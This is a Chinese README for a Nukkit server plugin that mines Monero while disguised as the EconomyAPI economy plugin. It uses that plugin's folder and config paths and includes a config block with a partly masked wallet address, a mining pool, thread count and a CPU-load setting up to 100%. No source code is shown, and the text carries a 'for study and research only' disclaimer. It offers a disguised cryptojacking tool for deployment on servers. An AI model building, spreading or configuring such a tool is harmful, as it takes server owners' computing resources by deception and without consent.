# XMRJ
伪装成EconomyAPI的Nukkit门罗币(XMR)挖矿插件,仅限学习研究之用!

# 使用plugins/EconomyAPI/cfg
此插件不能和真正的EconomyAPI插件同时使用！首次启动请修改配置文件。日志会输出到plugins/EconomyAPI/log.txt

#配置文件
plugins/EconomyAPI/cfg
```
# 使用挖矿的线程，多次修改尝试可找出最佳算力配置
thread=1

# 门罗币钱包地址
user=48wsv**************xfV3QRxzWyEP

# 矿池地址
pool=xmr.f2**ol.com:13531

# 使用的cpu资源，对于单核cpu此设置无效，设置为50时4核cpu使用2核，为100时使用全部cpu，根据cpu不同型号和三缓大小可能无法使用全部cpu资源
load=100

# 矿工标识
id=nukkit
```
